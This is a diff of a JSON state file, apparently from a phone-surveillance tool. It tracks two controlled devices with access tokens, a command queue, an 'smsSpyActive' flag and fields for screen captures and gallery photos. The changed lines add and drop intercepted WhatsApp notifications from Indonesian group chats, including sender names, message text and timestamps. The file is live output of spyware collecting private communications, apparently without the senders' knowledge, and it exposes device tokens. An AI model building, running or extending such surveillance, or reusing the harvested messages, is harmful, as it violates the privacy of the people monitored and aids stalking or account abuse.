@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775048428816,
+    "lastSeen": 1775048436099,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14459 pesan dari 10 chat",
+        "time": "01/04 21:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048431730
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13928 pesan): ~ syafa karamoy",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046973260
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13777 pesan): ~ 🕷️",
-        "content": "pemimpin arogan",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046973223
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775048431488,
+    "lastSeen": 1775048436995,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13929 pesan): ~ syafa karamoy",
+        "content": "💟 Stiker",
+        "time": "01/04 21:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048437192
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14459 pesan dari 10 chat",
+        "time": "01/04 21:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048431759
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13928 pesan): ~ syafa karamoy",
@@ -8048,22 +8064,6 @@
         "time": "01/04 20:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046975800
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13778 pesan): ~ Bot",
-        "content": "✅ Jawaban Benar! \nJawabannya adalah: pemimpin arogan\n\nSelamat kepada @⁨~🕷️⁩! 🎉\n🎁 Kamu mendapatkan hadiah +4 Limit Bot!",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046975747
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15955 pesan dari 11 chat",
-        "time": "01/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046973292
       }
     ],
     "galleryPhotos": [],
